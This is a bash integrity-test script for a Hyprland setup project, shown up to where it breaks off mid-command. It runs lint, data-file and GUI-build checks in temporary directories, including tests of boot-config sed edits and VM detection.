#!/usr/bin/env bash
#
# test.sh — repository integrity check.
#
# Installs nothing and touches no files; everything is generated in a temp directory.
#
# Usage:
#     ./tools/test.sh              # everything
#     ./tools/test.sh --quick      # skip the render matrix (fast pre-check)
#     ./tools/test.sh --only lint  # a single group: lint | schema | render
#
# Exit code: 0 all passed, 1 at least one check failed.
#
set -Eeuo pipefail

SETUP_ROOT="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
export SETUP_ROOT
cd "$SETUP_ROOT"

QUICK=0
ONLY=""
while (($#)); do
    case "$1" in
        --quick)  QUICK=1; shift ;;
        --only)   ONLY="$2"; shift 2 ;;
        --only=*) ONLY="${1#*=}"; shift ;;
        -h|--help) sed -n '3,13p' "${BASH_SOURCE[0]}" | sed 's/^# \{0,1\}//'; exit 0 ;;
        *) printf 'Unknown option: %s\n' "$1" >&2; exit 2 ;;
    esac
done

if [[ -t 1 && -z "${NO_COLOR:-}" ]]; then
    R=$'\033[0m'; B=$'\033[1m'; DIM=$'\033[2m'
    RED=$'\033[31m'; GRN=$'\033[32m'; YEL=$'\033[33m'
else
    R=''; B=''; DIM=''; RED=''; GRN=''; YEL=''
fi

PASS=0; FAIL=0; SKIP=0
FAILED_NAMES=()

pass() { printf '  %sok%s   %s\n' "$GRN" "$R" "$1"; PASS=$((PASS + 1)); }
skip() { printf '  %s--%s   %s %s(%s)%s\n' "$YEL" "$R" "$1" "$DIM" "$2" "$R"; SKIP=$((SKIP + 1)); }
fail() {
    printf '  %sXX%s   %s\n' "$RED" "$R" "$1"
    [[ -n "${2:-}" ]] && printf '%s' "$2" | sed 's/^/         /'
    FAIL=$((FAIL + 1)); FAILED_NAMES+=("$1")
}
group() { printf '\n%s%s%s\n' "$B" "$1" "$R"; }

want() { [[ -z "$ONLY" || "$ONLY" == "$1" ]]; }

TMP_ROOT="$(mktemp -d)"
# Keep lib/core.sh (sourced by the tests) from writing its log into the user's
# real state directory (~/.local/state/hyprsetup/logs).
export LOG_FILE="$TMP_ROOT/test.log"
trap 'rm -rf "$TMP_ROOT"' EXIT

# SOURCE bash scripts in the repo. Excluded:
#   *.tmpl      contain {{...}}, not valid bash in raw form
#   dotfiles/   output GENERATED from templates (200+ files). Not source;
#               they already go through bash -n in the render matrix. If
#               included here, shellcheck prints warnings for generated files
#               and leads you down the wrong path of fixing the output
#               instead of the source.
mapfile -t SHELL_FILES < <(
    find . -name '*.sh' -not -path './.git/*' -not -path './dotfiles/*/*' \
         -not -name '*.tmpl' | sort
    printf './hyprsetup-gui\n'
)

# ===========================================================  lint  =========
if want lint; then
    group "Syntax and lint"

    syntax_errors=""
    for f in "${SHELL_FILES[@]}"; do
        [[ -r "$f" ]] || continue
        if ! out=$(bash -n "$f" 2>&1); then
            syntax_errors+="$f: $out"$'\n'
        fi
    done
    if [[ -n "$syntax_errors" ]]; then
        fail "bash -n (${#SHELL_FILES[@]} script)" "$syntax_errors"
    else
        pass "bash -n (${#SHELL_FILES[@]} script)"
    fi

    # Entry points the user runs directly must be executable — the README
    # says "./install.sh"; if the file is 644 the command does not run at all
    # (the permission is easily lost in git/archive transfers).
    notexec=""
    for f in install.sh restore.sh hyprsetup-gui tools/build-dotfiles.sh \
             tools/preview.sh tools/test.sh dotfiles/install-dotfiles.sh; do
        [[ -e "$f" ]] || continue
        [[ -x "$f" ]] || notexec+="$f"$'\n'
    done
    if [[ -n "$notexec" ]]; then
        fail "entry points are executable" "$notexec"
    else
        pass "entry points are executable"
    fi

    if command -v shellcheck >/dev/null 2>&1; then
        # SC1091: sourced files are resolved at runtime.
        if out=$(shellcheck -x -e SC1091 -S warning "${SHELL_FILES[@]}" 2>&1); then
            pass "shellcheck"
        else
            fail "shellcheck" "$out"$'\n'
        fi
    else
        skip "shellcheck" "not installed: pacman -S shellcheck"
    fi

    # hook_plymouth's kernel command line / mkinitcpio edits.
    # If these expressions are wrong the machine may NOT BOOT; they are
    # verified on representative inputs without touching real files.
    # (They must be identical to the expressions in modules/system.sh.)
    boot_out=$(
        P="quiet splash"
        GRUB_SED="s/^(GRUB_CMDLINE_LINUX_DEFAULT=([\"']))(.*)\\2\$/\\1\\3 $P\\2/; s/^(GRUB_CMDLINE_LINUX_DEFAULT=([\"']))  */\\1/"
        problems=""
        t() {  # <label> <input> <expected> <sed>
            local got; got=$(printf '%s\n' "$2" | sed -E "$4")
            [[ "$got" == "$3" ]] || problems+="$1: '$got' != '$3'"$'\n'
        }
        t "grub double quotes" \
          'GRUB_CMDLINE_LINUX_DEFAULT="loglevel=3"' \
          'GRUB_CMDLINE_LINUX_DEFAULT="loglevel=3 quiet splash"' "$GRUB_SED"
        # CachyOS's default uses SINGLE quotes; an expression that only matches
        # double quotes silently does nothing there.
        t "grub single quotes" \
          "GRUB_CMDLINE_LINUX_DEFAULT='nowatchdog'" \
          "GRUB_CMDLINE_LINUX_DEFAULT='nowatchdog quiet splash'" "$GRUB_SED"
        t "grub empty value" \
          'GRUB_CMDLINE_LINUX_DEFAULT=""' \
          'GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"' "$GRUB_SED"
        t "grub leaves other keys alone" \
          'GRUB_CMDLINE_LINUX="root=/dev/sda1"' \
          'GRUB_CMDLINE_LINUX="root=/dev/sda1"' "$GRUB_SED"
        t "grub keeps comments intact" \
          '#GRUB_CMDLINE_LINUX_DEFAULT="old"' \
          '#GRUB_CMDLINE_LINUX_DEFAULT="old"' "$GRUB_SED"
        t "hooks systemd" \
          'HOOKS=(base systemd autodetect block filesystems)' \
          'HOOKS=(base systemd plymouth autodetect block filesystems)' \
          's/^(HOOKS=\(.*\bsystemd\b)/\1 plymouth/'
        t "hooks udev" \
          'HOOKS=(base udev autodetect block filesystems)' \
          'HOOKS=(base udev plymouth autodetect block filesystems)' \
          's/^(HOOKS=\(.*\budev\b)/\1 plymouth/'
        t "systemd-boot options" \
          'options root=UUID=1234 rw' \
          'options root=UUID=1234 rw quiet splash' \
          "s/^(options.*)\$/\1 $P/"
        printf '%s' "$problems"
    )
    if [[ -n "$boot_out" ]]; then
        fail "boot configuration sed expressions" "$boot_out"
    else
        pass "boot configuration sed expressions (8 cases)"
    fi

    # VM detection. On BARE METAL systemd-detect-virt prints "none" AND EXITS
    # WITH 1; a capture that confuses the two (e.g. "$(cmd || printf
    # none)") appends a second "none", the value becomes "none\nnone" and the
    # "== none" check misses — every physical machine would say "virtual
    # machine detected" and get an irrelevant warning. To avoid depending on
    # the real binary, systemd-detect-virt is replaced with a stub script.
    virt_out=$(
        problems=""
        stub_dir="$TMP_ROOT/virt-stub"
        mkdir -p "$stub_dir"
        check() {   # <what it prints> <exit code> <warning expected: yes|no>
            printf '#!/bin/sh\nprintf "%%s\\n" "%s"\nexit %s\n' "$1" "$2" \
                >"$stub_dir/systemd-detect-virt"
            chmod 755 "$stub_dir/systemd-detect-virt"
            local got
            got=$(PATH="$stub_dir:$PATH" bash -c '
                set -Eeuo pipefail
                source lib/core.sh; source lib/preflight.sh
                preflight_check_virt' 2>&1 || true)
            if [[ "$3" == no && -n "$got" ]]; then
                problems+="'$1' (exit $2): no warning expected, output:"$'\n'"$got"$'\n'
            elif [[ "$3" == yes && -z "$got" ]]; then
                problems+="'$1' (exit $2): expected a VM warning, got no output"$'\n'
            fi
        }
        check none   1 no     # bare metal — the actual regression
        check none   0 no
        check ""     0 no
        check oracle 0 yes    # VirtualBox
        check kvm    0 yes
        printf '%s' "$problems"
    )
    if [[ -n "$virt_out" ]]; then
        fail "VM detection" "$virt_out"
    else
        pass "VM detection (5 cases)"
    fi

    if out=$(python3 -m compileall -q python/hyprsetup 2>&1); then
        pass "python compile"
    else
        fail "python compile" "$out"$'\n'
    fi
    find python -name __pycache__ -type d -exec rm -rf {} + 2>/dev/null || true

    if command -v ruff >/dev/null 2>&1; then
        if out=$(ruff check python/ 2>&1); then
            pass "ruff"
        else
            fail "ruff" "$out"$'\n'
        fi
    else
        skip "ruff" "not installed"
    fi
fi

# =========================================================  schema  =========
if want schema; then
    group "Data files"

    if ! command -v jq >/dev/null 2>&1; then
        skip "JSON validation" "jq not installed"
    else
        json_bad=""
        for f in config/components.json config/keybinds.json; do
            jq empty "$f" 2>&1 | sed "s|^|$f: |" | { grep . && json_bad=1; } || true
        done
        if [[ -n "$json_bad" ]]; then
            fail "JSON syntax"
        else
            pass "JSON syntax (components, keybinds)"
        fi

        # Component ids must be unique across the catalog: install.sh derives
        # HAS_<ID> variables from the id, a collision silently renders the wrong template.
        dupes=$(jq -r '[.categories[].components[].id] | group_by(.) | map(select(length>1)) | .[][0]' config/components.json)
        if [[ -n "$dupes" ]]; then
            fail "component ids unique" "$dupes"$'\n'
        else
            pass "component ids unique"
        fi

        # Does every component referenced by a profile exist in the catalog?
        # Note: the component name is bound to $c separately — with "$ids | index(.)"
        # "." is rebound to $ids inside the pipe and the check catches nothing.
        missing=$(jq -r '
            [.categories[].components[].id] as $ids
            | (.profiles // {}) | to_entries[] | .key as $p | .value[] | . as $c
            | select($ids | index($c) | not) | "\($p): \($c)"' config/components.json)
        if [[ -n "$missing" ]]; then
            fail "profile components exist in catalog" "$missing"$'\n'
        else
            pass "profile components exist in catalog"
        fi

        # The single source of truth for components TO INSTALL is the
        # DEFAULT_COMPONENTS array at the top of install.sh, which is meant to be
        # hand-edited. A misspelled id there carries the install all the way to
        # catalog_validate and fails there — i.e. after some packages are
        # already installed. It needs to be caught here.
        default_comps=$(
            awk '/^DEFAULT_COMPONENTS=\(/{f=1; next}
                 f && /^\)/{exit}
                 f {sub(/#.*/, ""); print}' install.sh | tr ' \t' '\n\n' | awk 'NF'
        )
        comp_missing=""
        if [[ -z "$default_comps" ]]; then
            comp_missing="DEFAULT_COMPONENTS array not found in install.sh"
        else
            known_ids=$(jq -r '.categories[].components[].id' config/components.json)
            while IFS= read -r cid; do
                [[ -z "$cid" ]] && continue
                printf '%s\n' "$known_ids" | grep -qxF "$cid" \
                    || comp_missing+="$cid"$'\n'
            done <<<"$default_comps"
        fi
        if [[ -n "$comp_missing" ]]; then
            fail "DEFAULT_COMPONENTS exist in catalog" "$comp_missing"
        else
            pass "DEFAULT_COMPONENTS exist in catalog ($(printf '%s\n' "$default_comps" | awk 'NF' | wc -l) ids)"
        fi

            # hyprpm plugins are not pacman packages: installing them depends on the
        # plugin_repo + plugin_name fields (see modules/hypr.sh:_hyprpm_enable).
        # A missing field silently makes the component uninstallable.
        plug_bad=$(jq -r '
            .categories[] | select(.id=="plugins") | .components[]
            | select((.plugin_repo // "") == "" or (.plugin_name // "") == "")
            | .id' config/components.json)
        if [[ -n "$plug_bad" ]]; then
            fail "plugins have plugin_repo/plugin_name set" "$plug_bad"$'\n'
        else
            pass "plugins have plugin_repo/plugin_name set"
        fi

        # Plugins must NOT be a default in ANY profile: if the build breaks on a
        # Hyprland update the desktop changes silently; the user must take this
        # risk knowingly (see the comment in modules/hypr.sh).
        plug_default=$(jq -r '
            [.categories[] | select(.id=="plugins") | .components[].id] as $p
            | .profiles | to_entries[] | .key as $k | .value[] | . as $c
            | select($p | index($c)) | "\($k): \($c)"' config/components.json)
        if [[ -n "$plug_default" ]]; then
            fail "plugins are not a default in any profile" "$plug_default"$'\n'
        else
            pass "plugins are not a default in any profile"
        fi

    # Keybinding ids must be unique (KEYBINDS overrides match by id).
        kb_dupes=$(jq -r '[.categories[].binds[].id] | group_by(.) | map(select(length>1)) | .[][0]' config/keybinds.json)
        if [[ -n "$kb_dupes" ]]; then
            fail "keybinding ids unique" "$kb_dupes"$'\n'
        else
            pass "keybinding ids unique"
        fi
    fi

    # Shipped dotfiles must not carry the hardware of the machine that GENERATED
    # them. Output names (DP-1, HDMI-A-2, eDP-1 …) would ship one developer's
    # layout to everyone; waybar shows wrong workspace buttons for users
    # without those outputs. See render.py:PORTABLE_OUTPUT.
    leaked=$(grep -rlnE '"(DP|HDMI-A|eDP|DVI-D|USB-C)-[0-9]+"' dotfiles/ 2>/dev/null || true)
    if [[ -n "$leaked" ]]; then
        fail "no machine-specific output names in dotfiles" "$leaked"$'\n'
    else
        pass "no machine-specific output names in dotfiles"
    fi

    # Same class: the generating machine's HOME DIRECTORY must not leak either. An
    # absolute /home/<name> path points to a directory that does not exist for
    # another user installing the dotfiles (e.g. screen recording tries to write
    # there and silently fails). Paths must be '~' or '$HOME' expanded at runtime.
    home_leak=$(grep -rlE '/home/[a-z_][a-z0-9_-]*/' dotfiles/ 2>/dev/null || true)
    if [[ -n "$home_leak" ]]; then
        fail "no absolute home directory paths in dotfiles" "$home_leak"$'\n'
    else
        pass "no absolute home directory paths in dotfiles"
    fi

    # Numbers in the README go stale silently: when a theme/preset is added nobody
    # remembers to update the README and the file starts giving wrong info.
    readme_out=$(
        problems=""
        want() {  # <label> <actual> <pattern searched in README>
            grep -qE "$3" README.md \
                || problems+="$1: README does not say '$2' (searched: $3)"$'\n'
        }
        themes=$(PYTHONPATH=python python3 -c 'from hyprsetup import themes; print(len(themes.THEMES))')
        profiles=$(find presets/profile -maxdepth 1 -name '*.conf' | wc -l)
        bars=$(find presets/bar -name '*.conf' | wc -l)
        widgets=$(find presets/widget -name '*.conf' | wc -l)
        comps=$(jq '[.categories[].components[]] | length' config/components.json)
        cats=$(jq '.categories | length' config/components.json)
        binds=$(jq '[.categories[].binds[]] | length' config/keybinds.json)
        # A "setting" = a variable written to settings.conf and changeable from
        # the settings app, i.e. CONFIG_VARS. NOT the number of defaults in
        # lib/config.sh: install-time variables like AUR_HELPER/COMPILE also have
        # defaults there and they are not user-editable settings
        # (see the lib/config.sh:CONFIG_VARS comment).
        settings=$(python3 -c "
import re
text = open('lib/config.sh').read()
block = re.search(r'^CONFIG_VARS=\(\n(.*?)^\)', text, re.S | re.M).group(1)
names = {w for line in block.splitlines() for w in line.split('#')[0].split()}
print(len(names))")
        want "theme"    "$themes"   "$themes palettes"
        # The profile count may be 0: presets/profile/ is intentionally empty
        # until the profile system is rewritten (see presets/profile/.gitkeep).
        # The README must not contain a sentence like "0 profiles", so the count
        # is only searched for when profiles EXIST.
        if ((profiles)); then
            want "profile" "$profiles" "$profiles profiles"
        fi
        want "bar"      "$bars"     "$bars bar layouts"
        want "widget"   "$widgets"  "$widgets (desktop )?widgets"
        want "component" "$comps"   "$comps components"
        want "category" "$cats"     "$cats categories"
        want "keybinding" "$binds"  "$binds bindings"
        want "setting"  "$settings" "$settings settings"
        printf '%s' "$problems"
    )
    if [[ -n "$readme_out" ]]; then
        fail "README counts up to date" "$readme_out"
    else
        pass "README counts up to date (8 numbers)"
    fi

    # The intro tour and the README intro section come from the same file
    # (assets/intro/pages.json); if one changes and the other is not regenerated they drift.
    if intro_out=$(python3 tools/intro-readme.py --check 2>&1); then
        pass "README intro section in sync with pages.json"
    else
        fail "README intro section in sync with pages.json" "$intro_out"
    fi

    # THIRD_PARTY_NOTICES.md is generated from the manifests; a license or pin
    # change must be reflected there.
    if notices_out=$(python3 tools/third-party-notices.py --check 2>&1); then
        pass "THIRD_PARTY_NOTICES.md in sync with the manifests"
    else
        fail "THIRD_PARTY_NOTICES.md in sync with the manifests" "$notices_out"$'\n'
    fi

    # Shipped archives: only sources with a stated license, no media over the
    # limit (third-party art is downloaded at install time), and the repo's
    # license file travels with every archive whose repo has one.
    vendor_out=$(PYTHONPATH=python python3 - <<'VENDOREOF'
import tarfile
from pathlib import Path

from hyprsetup import rice

root = Path(".").resolve()
ignored = set((root / "vendor/rices/.gitignore").read_text().split())
problems = []
for name in rice.all_profiles(root):
    if rice.is_imported(root, name):
        continue
    manifest = rice.load(root, name)
    for (url, commit), license_ in manifest.source_licenses().items():
        archive = rice.vendor_archive(manifest.vendor, url, commit)
        if archive is None:
            continue
        if not license_:
            if archive.name not in ignored:
                problems.append(f"{archive.name}: no license stated but not git-ignored")
            continue
        with tarfile.open(archive) as tar:
            members = tar.getmembers()
        for member in members:
            if rice._is_remote_media(member):
                problems.append(f"{archive.name}: ships media {member.name}")
        if "." not in manifest.sources()[(url, commit)] and not any(
                "/" not in m.name and rice._LICENSE_FILE.match(m.name) for m in members):
            problems.append(f"{archive.name}: no license file in the archive")
print("\n".join(problems))
VENDOREOF
)
    if [[ -n "$vendor_out" ]]; then
        fail "shipped archives: licensed, no media, license file included" "$vendor_out"$'\n'
    else
        pass "shipped archives: licensed, no media, license file included"
    fi

    # Does every recommended icon set have a preview image shown before install
    # (assets/icon-previews; to generate: python3 tools/icon-previews.py)?
    if icon_out=$(python3 tools/icon-previews.py --check 2>&1); then
        pass "recommended icon sets have preview images"
    else
        fail "recommended icon sets have preview images" "$icon_out"
    fi

    if out=$(PYTHONPATH=python python3 -m hyprsetup check-schema --config-sh lib/config.sh 2>&1); then
        pass "settings.py ↔ lib/config.sh consistent"
    else
        fail "settings.py ↔ lib/config.sh consistent" "$out"$'\n'
    fi

    # The README describes settings.conf.example as "copy, edit, install.sh -c".
    # The file has end-of-line comments (LAYOUT="dwindle"  # ...); readers that
    # folded them into the value made config_validate fail the install.
    # Both readers (conffile.py, _conf_read) must give the same result and the
    # file must contain all of CONFIG_VARS.
    example_out=$(
        f=config/settings.conf.example
        py=$(PYTHONPATH=python python3 -c '
import sys; from hyprsetup import conffile
for k, v in sorted(conffile.parse_file(sys.argv[1]).items()): print(f"{k}=[{v}]")' "$f" | LC_ALL=C sort)
        sh=$(bash -c 'source lib/config.sh; keys=$(grep -oE "^[A-Za-z_][A-Za-z0-9_]*=" "$1" | tr -d = | sort -u)
            for k in $keys; do unset "$k"; done; _conf_read "$1"
            for k in $keys; do printf "%s=[%s]\n" "$k" "${!k}"; done' _ "$f" | LC_ALL=C sort)
        [[ "$py" == "$sh" ]] || diff <(printf '%s\n' "$py") <(printf '%s\n' "$sh") | head -5
        grep -q '^LAYOUT=\[dwindle\]$' <<<"$py" || echo "LAYOUT is read together with its end-of-line comment"
        python3 - "$f" <<'PY'
import re, sys
text = open("lib/config.sh").read()
block = re.search(r"^CONFIG_VARS=\(\n(.*?)^\)", text, re.S | re.M).group(1)
names = {w for line in block.splitlines() for w in line.split("#")[0].split()}
have = set(re.findall(r"^([A-Z][A-Z0-9_]+)=", open(sys.argv[1]).read(), re.M))
if names - have:
    print("missing from example:", " ".join(sorted(names - have)))
PY
    )
    if [[ -z "$example_out" ]]; then
        pass "settings.conf.example complete and identical in both readers"
    else
        fail "settings.conf.example complete and identical in both readers" "$example_out"$'\n'
    fi

    # The MOD+I panel and the full app are the SAME window (gui/quick.py only
    # starts panel mode). Three things are checked:
    #
    #   1. Does every schema group land on a page (app.PAGE_GROUPS)? If a new
    #      group is added but not mapped, it shows up nowhere in the UI and no
    #      error is raised — the user looks for the setting and cannot find it.
    #   2. Is the panel's window class different from the full app's? If they
    #      were the same, the "floating, slide from top" rules would also apply
    #      to the window opened from the menu, breaking tiling for the full app.
    #   3. Do the window rule's ratio and GTK's default size compute the same
    #      thing? If they drift the panel resizes right after it opens.
    # Importing app.py needs GTK4/libadwaita; without it (e.g. a GTK-less CI
    # image) $(...) fails and set -e would abort the whole script here.
    has_gtk=0
    python3 -c "
import gi
gi.require_version('Gtk', '4.0'); gi.require_version('Adw', '1')
from gi.repository import Gtk, Adw" >/dev/null 2>&1 && has_gtk=1

    if ((has_gtk == 0)); then
        skip "MOD+I panel carries all settings pages" "no GTK4/libadwaita"
    else
    quick_out=$(PYTHONPATH=python python3 - <<'QUICKEOF'
from hyprsetup import render
from hyprsetup import settings as schema
from hyprsetup.gui import app as gui
from hyprsetup.gui import quick

problems = []

schema_ids = [group.id for group in schema.GROUPS]
mapped = [gid for ids in gui.PAGE_GROUPS.values() for gid in ids]
problems += [f"{gid}: not shown on any page" for gid in schema_ids
             if gid not in mapped]
problems += [f"{gid}: in PAGE_GROUPS but not in the schema" for gid in mapped
             if gid not in schema_ids]
problems += [f"{gid}: twice in PAGE_GROUPS" for gid in set(mapped)
             if mapped.count(gid) > 1]
# A typo in the Simple/Advanced lists silently leaves a setting in simple mode
# or never hides it; neither gets noticed.
keys = schema.by_key()
problems += [f"{key}: in ADVANCED_KEYS but not in the schema"
             for key in sorted(schema.ADVANCED_KEYS - keys.keys())]
problems += [f"{gid}: in ADVANCED_GROUPS but not in the schema"
             for gid in sorted(schema.ADVANCED_GROUPS - set(schema_ids))]

if quick.QUICK_APP_ID == gui.APP_ID:
    problems.append("panel and full app use the same window class")

variables = {"BAR_POSITION": "top", "BAR_HEIGHT": "38", "BAR_MARGIN": "6"}
rule = render._quick_panel_vars(variables)
size = rule["QUICK_PANEL_SIZE"]
want = f"{render.QUICK_PANEL_WIDTH_PCT}% {render.QUICK_PANEL_HEIGHT_PCT}%"
if size != want:
    problems.append(f"window rule size {size!r}, expected {want!r}")
x_offset = rule["QUICK_PANEL_MOVE"].split()[0]
want_x = f"{(100 - render.QUICK_PANEL_WIDTH_PCT) // 2}%"
if x_offset != want_x:
    problems.append(f"panel not centered horizontally: {x_offset} (expected {want_x})")

for screen in ((1366, 768), (1920, 1080), (3840, 2160)):
    pixels = render.quick_panel_pixels(screen)
    expected = (screen[0] * render.QUICK_PANEL_WIDTH_PCT // 100,
                screen[1] * render.QUICK_PANEL_HEIGHT_PCT // 100)
    if pixels != expected:
        problems.append(f"{screen}: GTK size {pixels}, rule {expected}")
    # A panel pushed below the bar must not overflow the screen.
    top = int(rule["QUICK_PANEL_MOVE"].split()[1])
    if top + pixels[1] > screen[1]:
        problems.append(f"{screen}: panel overflows the bottom of the screen "
                        f"({top} + {pixels[1]})")

print(f"__COUNT__{len(schema.all_settings())}")
print("\n".join(problems))
QUICKEOF
)
    quick_count=$(printf '%s' "$quick_out" | sed -n 's/^__COUNT__//p')
    quick_problems=$(printf '%s' "$quick_out" | grep -v '^__COUNT__' | grep . || true)
    if [[ -n "$quick_problems" ]]; then
        fail "MOD+I panel carries all settings pages" "$quick_problems"$'\n'
    else
        pass "MOD+I panel carries all settings pages ($quick_count settings)"
    fi
    fi

    # That the pages ACTUALLY build: the check above only looks at
    # schema ↔ mapping consistency, it does not run the code that draws pages.
    # When a page method touches a field not yet defined (e.g. a wrong
    # __init__ order) the app DOES NOT OPEN; only building the window shows
    # this. No display needed: GTK4 widgets can be created without being
    # shown, and the window is never present()ed.
    if ((has_gtk == 0)); then
        skip "all settings app pages build" "no GTK4/libadwaita"
    else
        # XDG_CONFIG_HOME isolated: UI state is read from the user's REAL
        # settings.conf and (in the live-apply chain) CAN BE WRITTEN back
        # there. A test must never, under any condition, change the settings
        # of the running desktop.
        mkdir -p "$TMP_ROOT/gui-home"
        gui_out=$(XDG_CONFIG_HOME="$TMP_ROOT/gui-home" \
                  PYTHONPATH=python timeout 120 python3 - <<'GUIEOF'
from pathlib import Path

import gi
gi.require_version("Gtk", "4.0")
gi.require_version("Adw", "1")
from gi.repository import Adw, Gtk                 # noqa: E402

from hyprsetup.catalog import Catalog              # noqa: E402
from hyprsetup import settings as schema           # noqa: E402
from hyprsetup.gui import app as gui               # noqa: E402

catalog = Catalog.load("config/components.json")
result = {}


def walk(widget):
    yield widget
    child = widget.get_first_child()
    while child is not None:
        yield from walk(child)
        child = child.get_next_sibling()


def scroll_guarded(widget) -> bool:
    """Is the scroll wheel unable to change this widget's value?"""
    for controller in widget.observe_controllers():
        if (isinstance(controller, Gtk.EventControllerScroll)
                and controller.get_propagation_phase()
                == Gtk.PropagationPhase.CAPTURE):
            return True
    return False


def on_activate(application):
    try:
        window = gui.MainWindow(application, Path("."), catalog)
        # Lazy startup check: only the opening page is built on launch.
        if len(window._built_pages) > 2:
            result["error"] = f"too many pages built eagerly at startup: {sorted(window._built_pages)}"
            application.quit()
            return
        window.build_all_pages()
        result["pages"] = [page_id for page_id, _title, _icon in window.pages]
        # The mouse wheel must NOT CHANGE settings: pages are long, users
        # scroll the list with the wheel, and when the pointer passed over a
        # slider that setting changed unnoticed (and was applied instantly).
        # Every value widget must carry a controller that consumes scrolling
        # in the CAPTURE phase (gui.no_scroll_change).
        unguarded = []
        total = 0
        for widget in walk(window):
            if isinstance(widget, Gtk.Scale) or type(widget).__name__ == "SpinRow":
                total += 1
                if not scroll_guarded(widget):
                    unguarded.append(type(widget).__name__)
        result["value_widgets"] = total
        result["unguarded"] = unguarded

        # Search: EVERY schema setting must be indexed — if a new setting is
        # added and does not show up in search, the user looks, fails and assumes it does not exist.
        indexed = {hit.key for hit in window._search_index if hit.key}
        result["missing_from_search"] = sorted(
            setting.key for setting in schema.all_settings()
            if setting.key not in indexed)

        # Do sample queries really lead to the right page?
        checks = {
            "blur radius": ("BLUR_SIZE", "appearance"),
            "alt tab": (None, "behavior"),
            "lock the screen": ("IDLE_LOCK", "session"),
        }
        wrong = []
        for query, (want_key, want_page) in checks.items():
            window.search.set_text(query)
            # SearchEntry emits "search-changed" with a delay; since the test
            # does not run the main loop, the handler is called directly.
            window._on_search_changed(window.search)
            hits = window._result_hits
            if not hits:
                wrong.append(f"{query!r}: no results")
                continue
            if want_key and hits[0].key != want_key:
                wrong.append(f"{query!r}: first result {hits[0].key}, expected {want_key}")
            if hits[0].page_id != want_page:
                wrong.append(f"{query!r}: page {hits[0].page_id}, expected {want_page}")
        window.search.set_text("blur radius")
        window._on_search_changed(window.search)
        # If there are no results the checks above already complained; blowing
        # up here would bury the real problem under a traceback.
        if window._result_hits:
            window._open_hit(window._result_hits[0])
            if window.stack.get_visible_child_name() != "appearance":
                wrong.append("clicking the result did not change the page")
            row = window._setting_rows.get("BLUR_SIZE")
            if row is None or not row.has_css_class("hs-search-hit"):
                wrong.append("found row was not highlighted")
        result["search_problems"] = wrong
    except Exception:                                        # noqa: BLE001
        import traceback
        result["error"] = traceback.format_exc()
    application.quit()


application = Adw.Application(application_id="dev.hyprsetup.SelfTest")
application.connect("activate", on_activate)
application.run([])

if "error" in result:
    print(result["error"])
else:
    # Beyond every tab actually building, check that added pages are there:
    # a new page not registered in _add_pages silently disappears (the user
    # looks for the setting and cannot find it).
    want = {"start", "mix", "appearance", "wallcolors", "bar", "behavior", "session", "login",
            "keybinds", "apps", "components", "monitors", "system"}
    missing = sorted(want - set(result.get("pages", [])))
    if missing:
        print("missing page: " + ", ".join(missing))
    elif result.get("unguarded"):
        print("the mouse wheel can change the value of these widgets: "
              + ", ".join(sorted(set(result["unguarded"]))))
    elif not result.get("value_widgets"):
        print("no sliders found — the check is meaningless")
    elif result.get("missing_from_search"):
        print("settings not found by search: "
              + ", ".join(result["missing_from_search"][:8]))
    elif result.get("search_problems"):
        print("\n".join(result["search_problems"]))
    else:
        print(f"__PAGES__{len(result['pages'])}")
GUIEOF
)
        # Does the ALT+Tab window build too? It is a GTK window separate from
        # the settings app; if it broke, the error would only show when the
        # shortcut is pressed.
        sw_gui=$(XDG_CONFIG_HOME="$TMP_ROOT/gui-home" \
                 PYTHONPATH=python timeout 120 python3 - <<'SWGUIEOF'
import tempfile
from pathlib import Path

import gi
gi.require_version("Gtk", "4.0")
gi.require_version("Adw", "1")
from gi.repository import Adw                       # noqa: E402

from hyprsetup.gui import switcher                  # noqa: E402

clients = [
    {"address": "0xAAA", "class": "kitty", "title": "terminal", "monitor": 0,
     "workspace": {"id": 1, "name": "1"}, "focusHistoryID": 2,
     "stableId": "1", "mapped": True},
    {"address": "0xBBB", "class": "one.ablaze.floorp", "title": "Kick",
     "monitor": 1, "workspace": {"id": 7, "name": "7"}, "focusHistoryID": 1,
     "stableId": "2", "mapped": True},
]
values = {"SWITCHER_THUMB_WIDTH": "260", "SWITCHER_THUMBS": "false",
          "SWITCHER_SCOPE": "all", "SWITCHER_SORT": "recent"}
result = {}


def on_activate(application):
    try:
        with tempfile.TemporaryDirectory() as tmp:
            window = switcher.SwitcherWindow(application, clients, values,
                                             Path(tmp))
            result["cards"] = len(window._cards)
            window.advance(1)
            result["after_tab"] = window.index
            window.advance(1)
            result["wrap"] = window.index
    except Exception:                                        # noqa: BLE001
        import traceback
        result["error"] = traceback.format_exc()
    application.quit()


application = Adw.Application(application_id="dev.hyprsetup.SwitcherSelfTest")
application.connect("activate", on_activate)
application.run([])

problems = []
if "error" in result:
    problems.append(result["error"])
else:
    if result.get("cards") != 2:
        problems.append(f"card count {result.get('cards')}, expected 2")
    # Tab advances, wraps to the start after the last card.
    if result.get("after_tab") != 1 or result.get("wrap") != 0:
        problems.append(f"Tab navigation wrong: {result}")
print("\n".join(problems))
SWGUIEOF
)
        if [[ -n "$sw_gui" ]]; then
            fail "ALT+Tab window builds" "$sw_gui"$'\n'
        else
            pass "ALT+Tab window builds"
        fi

        gui_pages=$(printf '%s' "$gui_out" | sed -n 's/^__PAGES__//p')
        gui_problems=$(printf '%s' "$gui_out" | grep -v '^__PAGES__' | grep . || true)
        if [[ -n "$gui_problems" ]]; then
            fail "settings app: pages, wheel guard, search" "$gui_problems"$'\n'
        else
            pass "settings app: pages, wheel guard, search ($gui_pages pages)"
        fi
    fi

    # The installer asks a single question ("Start the installation?"); with
    # --dry-run it does not ask even that — nothing changes, so making someone
    # who said "show what you would do" wait on a question is pointless. If a
    # prompt leaks in here, a --dry-run called from a script/CI silently hangs.
    #
    # A PTY IS REQUIRED: confirm() (lib/core.sh) returns the default without
    # asking when stdin is not a terminal. A test run through a plain pipe
    # therefore proves nothing; 'script' gives us a pseudo-terminal.
    if ! command -v pacman >/dev/null 2>&1; then
        skip "--dry-run asks no questions" "no pacman (non-Arch machine)"
    elif ! command -v script >/dev/null 2>&1; then
        skip "--dry-run asks no questions" "util-linux 'script' not installed"
    else
        dry_home="$TMP_ROOT/dry-home"
        mkdir -p "$dry_home"
        dry_out="$TMP_ROOT/dry-run.out"
        # HOME is moved to a temp dir: --dry-run changes no files but still
        # creates ~/.cache/hyprsetup; the test should not even do that.
        HOME="$dry_home" \
